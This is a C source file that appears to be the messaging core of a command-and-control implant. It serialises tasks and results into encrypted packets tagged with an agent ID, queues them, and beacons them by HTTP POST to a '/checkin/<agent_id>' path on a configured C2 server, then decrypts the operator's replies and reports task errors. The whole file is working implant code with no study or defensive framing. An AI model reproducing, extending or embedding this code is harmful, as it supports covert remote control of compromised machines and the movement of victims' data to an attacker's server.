#include "core/package.h"
#include "crypto/crypto.h"
#include "transport/http.h"
#include "config.h"

#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#define PACKAGE_INITIAL_CAPACITY  256
#define AGENT_ID_BUF_SIZE         256

static char      g_agent_id[AGENT_ID_BUF_SIZE] = {0};
static package_t *g_queue_head = NULL;
static package_t *g_queue_tail = NULL;

static int      ensure_capacity(ppackage_t pkg, size_t extra);
static void     write_u32_be(uint8_t *dst, uint32_t val);
static void     write_u64_be(uint8_t *dst, uint64_t val);
static uint32_t read_u32_be(const uint8_t *src);
static uint64_t read_u64_be(const uint8_t *src);
static int      finalize_package(ppackage_t pkg, uint8_t **out_wire, size_t *out_wire_len);
static int      transport_send(const uint8_t *data, size_t len,
                               uint8_t **out_resp, size_t *out_resp_len);

void package_set_agent_id(const char *id) {
    if (id) {
        strncpy(g_agent_id, id, AGENT_ID_BUF_SIZE - 1);
        g_agent_id[AGENT_ID_BUF_SIZE - 1] = '\0';
    }
}

ppackage_t package_create(uint32_t command) {
    ppackage_t pkg = (ppackage_t)calloc(1, sizeof(package_t));
    if (!pkg) return NULL;

    pkg->command  = command;
    pkg->encrypt  = 1;
    pkg->destroy  = 1;
    pkg->capacity = PACKAGE_INITIAL_CAPACITY;
    pkg->buffer   = (uint8_t *)malloc(pkg->capacity);
    if (!pkg->buffer) { free(pkg); return NULL; }
    return pkg;
}

ppackage_t package_create_with_metadata(uint32_t command) {
    ppackage_t pkg = package_create(command);
    if (!pkg) return NULL;

    if (!ensure_capacity(pkg, PACKAGE_HEADER_SIZE)) {
        package_destroy(pkg);
        return NULL;
    }

    write_u32_be(pkg->buffer + 0,  0);               /* length placeholder */
    write_u32_be(pkg->buffer + 4,  PACKAGE_MAGIC);
    *(uint16_t *)(pkg->buffer + 8)  = _byteswap_ushort(PACKAGE_PROTOCOL_VERSION);

    uint16_t flags = 0;
    if (pkg->encrypt) flags |= PKG_FLAG_ENCRYPTED;
    *(uint16_t *)(pkg->buffer + 10) = _byteswap_ushort(flags);
    pkg->flags = flags;

    memset(pkg->buffer + 12, 0, 4);
    if (g_agent_id[0]) {
        uint32_t hash = 5381;
        for (const char *s = g_agent_id; *s; s++)
            hash = ((hash << 5) + hash) + (unsigned char)*s;
        write_u32_be(pkg->buffer + 12, hash);
    }

    write_u32_be(pkg->buffer + 16, command);
    write_u32_be(pkg->buffer + 20, 0);
    pkg->length = PACKAGE_HEADER_SIZE;
    return pkg;
}

ppackage_t package_create_with_request_id(uint32_t command, uint32_t request_id) {
    ppackage_t pkg = package_create_with_metadata(command);
    if (!pkg) return NULL;
    write_u32_be(pkg->buffer + 20, request_id);
    pkg->request_id = request_id;
    return pkg;
}

void package_destroy(ppackage_t pkg) {
    if (!pkg) return;
    free(pkg->buffer);
    free(pkg);
}

/**
 * @brief Grow pkg->buffer to hold at least extra more bytes.
 * @param pkg   Package whose buffer to grow.
 * @param extra Number of additional bytes needed.
 * @return 1 on success, 0 on allocation failure.
 */
static int ensure_capacity(ppackage_t pkg, size_t extra) {
    if (!pkg) return 0;
    size_t needed = pkg->length + extra;
    if (needed <= pkg->capacity) return 1;

    size_t new_cap = pkg->capacity * 2;
    if (new_cap < needed) new_cap = needed;
    uint8_t *new_buf = (uint8_t *)realloc(pkg->buffer, new_cap);
    if (!new_buf) return 0;

    pkg->buffer   = new_buf;
    pkg->capacity = new_cap;
    return 1;
}

/**
 * @param dst Destination (4 bytes).
 * @param val Value to write big-endian.
 */
static void write_u32_be(uint8_t *dst, uint32_t val) {
    dst[0] = (uint8_t)(val >> 24);
    dst[1] = (uint8_t)(val >> 16);
    dst[2] = (uint8_t)(val >> 8);
    dst[3] = (uint8_t)(val);
}

/**
 * @param dst Destination (8 bytes).
 * @param val Value to write big-endian.
 */
static void write_u64_be(uint8_t *dst, uint64_t val) {
    write_u32_be(dst,     (uint32_t)(val >> 32));
    write_u32_be(dst + 4, (uint32_t)(val));
}

/**
 * @param src Source (4 bytes, big-endian).
 * @return Decoded uint32.
 */
static uint32_t read_u32_be(const uint8_t *src) {
    return ((uint32_t)src[0] << 24) | ((uint32_t)src[1] << 16) |
           ((uint32_t)src[2] << 8)  |  (uint32_t)src[3];
}

/**
 * @param src Source (8 bytes, big-endian).
 * @return Decoded uint64.
 */
static uint64_t read_u64_be(const uint8_t *src) {
    return ((uint64_t)read_u32_be(src) << 32) | read_u32_be(src + 4);
}

void package_add_int32(ppackage_t pkg, uint32_t value) {
    if (!pkg || !ensure_capacity(pkg, 4)) return;
    write_u32_be(pkg->buffer + pkg->length, value);
    pkg->length += 4;
}

void package_add_int64(ppackage_t pkg, uint64_t value) {
    if (!pkg || !ensure_capacity(pkg, 8)) return;
    write_u64_be(pkg->buffer + pkg->length, value);
    pkg->length += 8;
}

void package_add_bool(ppackage_t pkg, int value) {
    package_add_int32(pkg, value ? 1 : 0);
}

void package_add_ptr(ppackage_t pkg, const void *ptr) {
    if (!pkg || !ensure_capacity(pkg, 8)) return;
    write_u64_be(pkg->buffer + pkg->length, (uint64_t)(uintptr_t)ptr);
    pkg->length += 8;
}

void package_add_bytes(ppackage_t pkg, const uint8_t *data, size_t len) {
    if (!pkg || !ensure_capacity(pkg, 4 + len)) return;
    write_u32_be(pkg->buffer + pkg->length, (uint32_t)len);
    pkg->length += 4;
    if (len > 0) {
        memcpy(pkg->buffer + pkg->length, data, len);
        pkg->length += len;
    }
}

void package_add_string(ppackage_t pkg, const char *str) {
    if (!pkg) return;
    size_t len = str ? (strlen(str) + 1) : 1;
    if (!ensure_capacity(pkg, 4 + len)) return;
    write_u32_be(pkg->buffer + pkg->length, (uint32_t)len);
    pkg->length += 4;
    if (str) memcpy(pkg->buffer + pkg->length, str, len);
    else     pkg->buffer[pkg->length] = '\0';
    pkg->length += len;
}

void package_add_wstring(ppackage_t pkg, const wchar_t *str) {
    if (!pkg) return;
    size_t len = str ? (wcslen(str) + 1) * sizeof(wchar_t) : sizeof(wchar_t);
    if (!ensure_capacity(pkg, 4 + len)) return;
    write_u32_be(pkg->buffer + pkg->length, (uint32_t)len);
    pkg->length += 4;
    if (str) memcpy(pkg->buffer + pkg->length, str, len);
    else     memset(pkg->buffer + pkg->length, 0, sizeof(wchar_t));
    pkg->length += len;
}

void package_add_pad(ppackage_t pkg, const uint8_t *data, size_t len) {
    if (!pkg || !data || len == 0 || !ensure_capacity(pkg, len)) return;
    memcpy(pkg->buffer + pkg->length, data, len);
    pkg->length += len;
}

/**
 * @brief Optionally encrypt the payload and assemble the final wire buffer.
 * @param pkg          Package to finalise.
 * @param out_wire     Receives heap-allocated wire bytes. Caller must free().
 * @param out_wire_len Receives total byte count.
 * @return 0 on success, -1 on failure.
 */
static int finalize_package(ppackage_t pkg,
                            uint8_t **out_wire, size_t *out_wire_len) {
    if (!pkg || !out_wire || !out_wire_len) return -1;

    uint8_t *payload     = pkg->buffer + PACKAGE_HEADER_SIZE;
    size_t   payload_len = pkg->length  - PACKAGE_HEADER_SIZE;

    uint8_t *final_payload     = NULL;
    size_t   final_payload_len = 0;

    if (pkg->encrypt) {
        final_payload = aead_encrypt(payload, payload_len, &final_payload_len);
        if (!final_payload) return -1;
    } else if (payload_len > 0) {
        final_payload = (uint8_t *)malloc(payload_len);
        if (!final_payload) return -1;
        memcpy(final_payload, payload, payload_len);
        final_payload_len = payload_len;
    }

    size_t   wire_len = PACKAGE_HEADER_SIZE + final_payload_len;
    uint8_t *wire     = (uint8_t *)malloc(wire_len);
    if (!wire) { free(final_payload); return -1; }

    memcpy(wire, pkg->buffer, PACKAGE_HEADER_SIZE);
    write_u32_be(wire, (uint32_t)(wire_len - 4));
    if (final_payload_len > 0)
        memcpy(wire + PACKAGE_HEADER_SIZE, final_payload, final_payload_len);
    free(final_payload);

    *out_wire     = wire;
    *out_wire_len = wire_len;
    return 0;
}

/**
 * @brief POST data to /checkin/<agent_id> and return the raw response.
 * @param data         Wire bytes to send.
 * @param len          Number of bytes to send.
 * @param out_resp     Receives heap-allocated response. Caller must free().
 * @param out_resp_len Receives response length.
 * @return 0 on success, -1 on failure.
 */
static int transport_send(const uint8_t *data, size_t len,
                          uint8_t **out_resp, size_t *out_resp_len) {
    char uri[320];
    if (g_agent_id[0])
        snprintf(uri, sizeof(uri), "/checkin/%s", g_agent_id);
    else {
        strncpy(uri, "/checkin/unknown", sizeof(uri) - 1);
        uri[sizeof(uri) - 1] = '\0';
    }

    uint8_t *resp_buf = NULL;
    int      resp_len = 0;

    int ret = http_post_raw(C2_SERVER_IP, C2_SERVER_PORT,
                            uri, data, (int)len, &resp_buf, &resp_len);
    if (ret != 0 || !resp_buf || resp_len <= 0) {
        free(resp_buf);
        if (out_resp)     *out_resp     = NULL;
        if (out_resp_len) *out_resp_len = 0;
        return -1;
    }

    if (out_resp)     *out_resp     = resp_buf;
    else              free(resp_buf);
    if (out_resp_len) *out_resp_len = (size_t)resp_len;
    return 0;
}

void package_transmit(ppackage_t pkg) {
    if (!pkg) return;
    pkg->next = NULL;
    if (!g_queue_tail) {
        g_queue_head = pkg;
        g_queue_tail = pkg;
    } else {
        g_queue_tail->next = pkg;
        g_queue_tail = pkg;
    }
}

int package_transmit_now(ppackage_t pkg,
                         uint8_t **out_response,
                         size_t   *out_response_len) {
    if (!pkg) {
        if (out_response)     *out_response     = NULL;
        if (out_response_len) *out_response_len = 0;
        return -1;
    }

    uint8_t *wire     = NULL;
    size_t   wire_len = 0;
    uint8_t *resp_raw = NULL;
    size_t   resp_raw_len = 0;

    if (finalize_package(pkg, &wire, &wire_len) != 0) {
        if (pkg->destroy) package_destroy(pkg);
        return -1;
    }

    if (transport_send(wire, wire_len, &resp_raw, &resp_raw_len) != 0) {
        free(wire);
        if (pkg->destroy) package_destroy(pkg);
        return -1;
    }
    free(wire);

    /* The server sends wire format: plaintext header(24) + encrypted payload.
     * Read the encrypted flag from the header before decrypting — passing the
     * whole response to aead_decrypt() would treat header bytes as the nonce. */
    if (resp_raw && resp_raw_len >= PACKAGE_HEADER_SIZE) {
        uint16_t resp_flags = ((uint16_t)resp_raw[10] << 8) | resp_raw[11];

        if ((resp_flags & PKG_FLAG_ENCRYPTED) && pkg->encrypt) {
            const uint8_t *enc     = resp_raw + PACKAGE_HEADER_SIZE;
            size_t         enc_len = resp_raw_len - PACKAGE_HEADER_SIZE;

            if (enc_len >= 28) {
                size_t   plain_len = 0;
                uint8_t *plain = aead_decrypt(enc, enc_len, &plain_len);
                if (plain) {
                    size_t   final_len = PACKAGE_HEADER_SIZE + plain_len;
                    uint8_t *final_buf = (uint8_t *)malloc(final_len);
                    if (final_buf) {
                        memcpy(final_buf, resp_raw, PACKAGE_HEADER_SIZE);
                        memcpy(final_buf + PACKAGE_HEADER_SIZE, plain, plain_len);
                    }
                    free(plain);
                    free(resp_raw);
                    resp_raw     = final_buf;
                    resp_raw_len = final_buf ? final_len : 0;
                } else {
                    free(resp_raw);
                    resp_raw     = NULL;
                    resp_raw_len = 0;
                }
            }
        }
    }

    if (out_response)     *out_response     = resp_raw;
    else if (resp_raw)    free(resp_raw);
    if (out_response_len) *out_response_len = resp_raw_len;

    if (pkg->destroy) package_destroy(pkg);
    return 0;
}

int package_transmit_all(uint8_t **out_response, size_t *out_response_len) {
    if (!g_queue_head) {
        ppackage_t ping = package_create_with_metadata(PKG_CMD_CHECKIN);
        if (!ping) return -1;
        return package_transmit_now(ping, out_response, out_response_len);
    }

    ppackage_t batch = package_create_with_metadata(PKG_CMD_CHECKIN);
    if (!batch) return -1;
    batch->flags |= PKG_FLAG_BATCH;
    *(uint16_t *)(batch->buffer + 10) = _byteswap_ushort(batch->flags);

    package_t *curr = g_queue_head;
    while (curr) {
        uint8_t *sub_wire = NULL;
        size_t   sub_len  = 0;
        if (finalize_package(curr, &sub_wire, &sub_len) == 0) {
            package_add_pad(batch, sub_wire, sub_len);
            free(sub_wire);
        }
        package_t *next = curr->next;
        curr->next = NULL;
        package_destroy(curr);
        curr = next;
    }
    g_queue_head = NULL;
    g_queue_tail = NULL;

    return package_transmit_now(batch, out_response, out_response_len);
}

void package_transmit_error(uint32_t request_id, uint32_t error_code) {
    ppackage_t pkg = package_create_with_request_id(PKG_CMD_TASK_ERROR, request_id);
    if (!pkg) return;
    package_add_int32(pkg, error_code);
    package_transmit(pkg);
}

void package_reader_init(package_reader_t *r, const uint8_t *data, size_t len) {
    r->data   = data;
    r->length = len;
    r->offset = 0;
}

/**
 * @brief Check that at least need bytes remain in the reader.
 * @param r    Reader.
 * @param need Bytes required.
 * @return 1 if enough bytes remain, 0 otherwise.
 */
static int reader_check(package_reader_t *r, size_t need) {
    return r && r->offset + need <= r->length;
}

int package_read_int32(package_reader_t *r, uint32_t *out) {
    if (!reader_check(r, 4)) return 0;
    *out = read_u32_be(r->data + r->offset);
    r->offset += 4;
    return 1;
}

int package_read_int64(package_reader_t *r, uint64_t *out) {
    if (!reader_check(r, 8)) return 0;
    *out = read_u64_be(r->data + r->offset);
    r->offset += 8;
    return 1;
}

int package_read_bool(package_reader_t *r, int *out) {
    uint32_t v = 0;
    if (!package_read_int32(r, &v)) return 0;
    *out = (v != 0);
    return 1;
}

int package_read_bytes(package_reader_t *r, const uint8_t **out, size_t *out_len) {
    uint32_t len = 0;
    if (!reader_check(r, 4)) return 0;
    len = read_u32_be(r->data + r->offset);
    r->offset += 4;
    if (!reader_check(r, len)) return 0;
    *out = r->data + r->offset;
    if (out_len) *out_len = len;
    r->offset += len;
    return 1;
}

int package_read_string(package_reader_t *r, const char **out, size_t *out_len) {
    const uint8_t *bytes = NULL;
    size_t         len   = 0;
    if (!package_read_bytes(r, &bytes, &len)) return 0;
    if (len == 0 || bytes[len - 1] != '\0') return 0;
    *out = (const char *)bytes;
    if (out_len) *out_len = len;
    return 1;
}

int package_read_wstring(package_reader_t *r, const wchar_t **out, size_t *out_len) {
    const uint8_t *bytes = NULL;
    size_t         len   = 0;
    if (!package_read_bytes(r, &bytes, &len)) return 0;
    if (len % sizeof(wchar_t) != 0 || len == 0) return 0;
    const wchar_t *w = (const wchar_t *)bytes;
    if (w[len / sizeof(wchar_t) - 1] != L'\0') return 0;
    *out = w;
    if (out_len) *out_len = len;
    return 1;
}

int package_reader_parse_header(package_reader_t *r, package_header_t *hdr) {
    if (!r || !hdr || r->length < PACKAGE_HEADER_SIZE) return 0;

    hdr->length     = read_u32_be(r->data);
    hdr->magic      = read_u32_be(r->data + 4);
    hdr->version    = (uint16_t)((r->data[8]  << 8) | r->data[9]);
    hdr->flags      = (uint16_t)((r->data[10] << 8) | r->data[11]);
    hdr->agent_id   = read_u32_be(r->data + 12);
    hdr->command    = read_u32_be(r->data + 16);
    hdr->request_id = read_u32_be(r->data + 20);

    r->offset = PACKAGE_HEADER_SIZE;
    return 1;
}
